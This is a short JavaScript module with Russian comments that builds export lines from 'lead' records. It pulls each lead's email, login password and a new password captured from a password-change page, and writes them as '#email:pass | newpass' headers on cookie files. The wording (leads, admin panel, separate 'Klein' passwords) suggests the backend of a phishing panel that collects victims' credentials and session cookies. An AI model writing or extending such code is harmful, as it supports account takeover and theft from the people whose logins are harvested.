'use strict';

/**
 * Текстовые выгрузки WEB — только строки с основной почтой (поле email).
 * Гибрид Klein+WEB не отсекаем по brand: в файл идут WEB email/pass, без passwordKl.
 */
function hasWebMailboxForExport(lead) {
  const em = lead && lead.email != null ? String(lead.email).trim() : '';
  return em !== '';
}

/**
 * Пароль входа WEB и новый пароль со страницы смены WEB.
 * Не использует login_kl / change_kl / passwordKl — чтобы в «new» не попадал пароль Klein.
 *
 * Вход: в админке это поле Password — источник правды `lead.password`, не «первый login» в истории
 * (иначе в куки/выгрузку попадает самый старый ввод вместо актуального).
 */
function getWebLoginAndNewPasswordForExport(lead) {
  const history = Array.isArray(lead && lead.passwordHistory) ? lead.passwordHistory : [];
  let passLogin = lead && lead.password != null ? String(lead.password).trim() : '';
  if (!passLogin) {
    for (let i = history.length - 1; i >= 0; i--) {
      const e = history[i];
      if (e && e.s === 'login' && e.p != null) {
        passLogin = String(e.p).trim();
        break;
      }
    }
  }
  if (!passLogin) {
    const firstLogin = history.find(function (e) {
      return e && e.s === 'login';
    });
    if (firstLogin && firstLogin.p != null) passLogin = String(firstLogin.p).trim();
  }
  let passNew = '';
  for (let i = history.length - 1; i >= 0; i--) {
    const e = history[i];
    if (e && e.s === 'change') {
      passNew = e.p != null ? String(e.p).trim() : '';
      break;
    }
  }
  if (!passNew && lead && lead.changePasswordData && lead.changePasswordData.newPassword != null) {
    passNew = String(lead.changePasswordData.newPassword).trim();
  }
  return { passLogin: passLogin || '', passNew: passNew || '' };
}

/**
 * Строка комментария в начале файла куков: #email:pass или #email:pass | newpass
 */
function formatCookieFileCommentLine(email, passLogin, passNew) {
  const em = email != null ? String(email).trim() : '';
  const pl = passLogin != null ? String(passLogin) : '';
  let line = '#' + em + ':' + pl;
  if (passNew != null && String(passNew).trim() !== '') {
    line += ' | ' + String(passNew).trim();
  }
  return line;
}

module.exports = {
  hasWebMailboxForExport,
  getWebLoginAndNewPasswordForExport,
  formatCookieFileCommentLine,
};
